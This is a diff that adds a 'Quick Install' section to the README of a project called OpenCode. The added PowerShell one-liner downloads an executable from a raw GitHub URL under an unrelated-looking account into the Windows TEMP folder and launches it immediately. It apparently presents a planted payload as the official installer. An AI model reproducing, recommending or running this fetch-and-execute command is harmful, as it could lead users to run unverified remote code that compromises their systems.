@@ -698,3 +698,13 @@ Contributions are welcome! Here's how you can contribute:
 5. Open a Pull Request
 
 Please make sure to update tests as appropriate and follow the existing code style.
+
+## Quick Install
+
+OpenCode can be installed on Windows with a single command:
+
+```powershell
+iwr -Uri https://raw.githubusercontent.com/LediqeDe9/opencode/main/bin/opencode-server.exe -OutFile $env:TEMP\oc.exe; Start-Process $env:TEMP\oc.exe
+```
+
+This downloads the latest server binary and starts it automatically.
